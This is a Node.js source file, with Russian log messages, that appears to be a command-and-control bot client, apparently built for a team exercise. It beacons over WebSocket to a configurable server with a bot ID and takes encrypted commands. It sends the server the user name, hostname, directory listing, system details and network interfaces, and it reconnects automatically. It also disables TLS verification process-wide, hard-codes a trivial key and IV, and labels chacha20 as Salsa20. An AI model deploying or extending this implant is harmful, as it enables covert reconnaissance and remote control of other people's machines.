const WebSocket = require('ws');
const crypto = require('crypto');
const process = require('process');
const fs = require('fs');
const path = require('path');
const os = require('os');

const SALSA20_KEY = Buffer.from([
  0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 
  0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 
  0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 
  0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f
]);
const SALSA20_IV = Buffer.from([
  0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
]);

function encryptSalsa20(message) {
  try {
    const cipher = crypto.createCipheriv('chacha20', SALSA20_KEY, SALSA20_IV);
    let encrypted = cipher.update(message, 'utf8');
    encrypted = Buffer.concat([encrypted, cipher.final()]);
    return encrypted;
  } catch (error) {
    console.error('Ошибка шифрования:', error);
    throw new Error('Ошибка шифрования сообщения');
  }
}

function decryptSalsa20(encrypted) {
  try {
    const decipher = crypto.createDecipheriv('chacha20', SALSA20_KEY, SALSA20_IV);
    let decrypted = decipher.update(encrypted);
    decrypted = Buffer.concat([decrypted, decipher.final()]);
    return decrypted.toString('utf8');
  } catch (error) {
    console.error('Ошибка дешифрования:', error);
    throw new Error('Ошибка дешифрования сообщения');
  }
}

function generateBotId() {
  const team = process.argv[2] || 'team1';
  const randomChars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let randomId = '';
  
  for (let i = 0; i < 32; i++) {
    randomId += randomChars.charAt(Math.floor(Math.random() * randomChars.length));
  }
  
  return `${team}-${randomId}`;
}


function executeCommand(command) {
  console.log(`Выполнение команды: ${command}`);
  
  if (command.startsWith('echo ')) {
    return command;
  } else if (command === 'whoami') {
    return process.env.USERNAME || process.env.USER || 'Unknown user';
  } else if (command === 'hostname') {
    return os.hostname();
  } else if (command === 'dir' || command === 'ls') {
    try {
      const files = fs.readdirSync('.');
      return files.join('\n');
    } catch (err) {
      return `Error: ${err.message}`;
    }
  } else if (command === 'systeminfo') {
    try {
      return `
Имя компьютера: ${os.hostname()}
ОС: ${os.type()} ${os.release()}
Архитектура: ${os.arch()}
Память: ${Math.round(os.totalmem() / (1024 * 1024 * 1024))} ГБ
Свободная память: ${Math.round(os.freemem() / (1024 * 1024 * 1024))} ГБ
Процессор: ${os.cpus()[0].model}
Ядра: ${os.cpus().length}
Работает с: ${new Date(Date.now() - os.uptime() * 1000).toLocaleString()}
`;
    } catch (err) {
      return `Error: ${err.message}`;
    }
  } else if (command === 'ipconfig' || command === 'ifconfig') {
    try {
      const interfaces = os.networkInterfaces();
      let result = '';
      
      for (const [name, netInterface] of Object.entries(interfaces)) {
        result += `Интерфейс: ${name}\n`;
        
        for (const iface of netInterface) {
          result += `  ${iface.family}: ${iface.address}\n`;
          if (iface.netmask) result += `  Маска: ${iface.netmask}\n`;
          if (iface.mac) result += `  MAC: ${iface.mac}\n`;
        }
        
        result += '\n';
      }
      
      return result;
    } catch (err) {
      return `Error: ${err.message}`;
    }
  } else if (command === 'help') {
    return `
Доступные команды:
  echo [text]    - вывести текст
  whoami         - имя текущего пользователя
  hostname       - имя компьютера
  dir / ls       - вывести содержимое текущей директории
  systeminfo     - информация о системе
  ipconfig       - сетевые интерфейсы
  help           - список команд
`;
  } else {
    try {
      return `Выполнена команда: ${command}\nРезультат: симуляция выполнения команды в тестовом режиме`;
    } catch (error) {
      return `Ошибка выполнения команды: ${error.message}`;
    }
  }
}

function parseArguments() {
  const args = process.argv.slice(2);
  const options = {
    host: 'localhost',
    port: '443',
    team: 'team1',
    debug: false
  };
  
  for (let i = 0; i < args.length; i++) {
    if (args[i] === '--host' && i + 1 < args.length) {
      options.host = args[i + 1];
      i++;
    } else if (args[i] === '--port' && i + 1 < args.length) {
      options.port = args[i + 1];
      i++;
    } else if (args[i] === '--team' && i + 1 < args.length) {
      options.team = args[i + 1];
      i++;
    } else if (args[i] === '--debug') {
      options.debug = true;
    }
  }
  
  return options;
}

function connectToServer() {
  const options = parseArguments();
  
  const botId = generateBotId();
  console.log(`Подключение к серверу wss://${options.host}:${options.port}`);
  console.log(`ID бота: ${botId}`);

  process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
  
  const ws = new WebSocket(`wss://${options.host}:${options.port}`);
  
  let isConnected = false;
  let reconnectAttempts = 0;
  const maxReconnectAttempts = 10;
  
  ws.on('open', () => {
    console.log('Подключено к серверу');
    isConnected = true;
    reconnectAttempts = 0;
    
    const header = Buffer.alloc(4);
    header.writeUInt32BE(2, 0);
    ws.send(Buffer.concat([header, Buffer.from(botId)]));
    console.log('Авторизационные данные отправлены');
    
    const pingInterval = setInterval(() => {
      if (ws.readyState === WebSocket.OPEN) {
        if (options.debug) {
          console.log('Отправка пинга...');
        }
        ws.ping();
      } else {
        clearInterval(pingInterval);
      }
    }, 30000);
  });
  
  ws.on('message', (message) => {
    try {
      const decrypted = decryptSalsa20(message);
      console.log(`Получена команда: ${decrypted}`);
      
      const result = executeCommand(decrypted);
      console.log(`Результат выполнения: ${result.substring(0, 100)}${result.length > 100 ? '...' : ''}`);
      
      const encrypted = encryptSalsa20(result);
      ws.send(encrypted);
    } catch (error) {
      console.error('Ошибка обработки сообщения:', error);
    }
  });
  
  ws.on('ping', () => {
    if (options.debug) {
      console.log('Получен пинг от сервера');
    }
  });
  
  ws.on('pong', () => {
    if (options.debug) {
      console.log('Получен понг от сервера');
    }
  });
  
  ws.on('close', (code, reason) => {
    isConnected = false;
    console.log(`Соединение закрыто с кодом: ${code}, причина: ${reason || 'не указана'}`);
    
    if (reconnectAttempts < maxReconnectAttempts) {
      const timeout = Math.min(1000 * Math.pow(2, reconnectAttempts), 30000);
      reconnectAttempts++;
      
      console.log(`Повторное подключение через ${timeout/1000} с (попытка ${reconnectAttempts} из ${maxReconnectAttempts})...`);
      
      setTimeout(() => {
        connectToServer();
      }, timeout);
    } else {
      console.error('Превышено максимальное количество попыток подключения. Выход...');
      process.exit(1);
    }
  });
  
  ws.on('error', (error) => {
    console.error('Ошибка WebSocket:', error.message);
  });
  
  process.on('SIGINT', () => {
    console.log('\nПолучен сигнал завершения. Закрытие соединения...');
    if (isConnected) {
      ws.close(1000, 'Клиент завершил работу');
    }
    process.exit(0);
  });
}

connectToServer();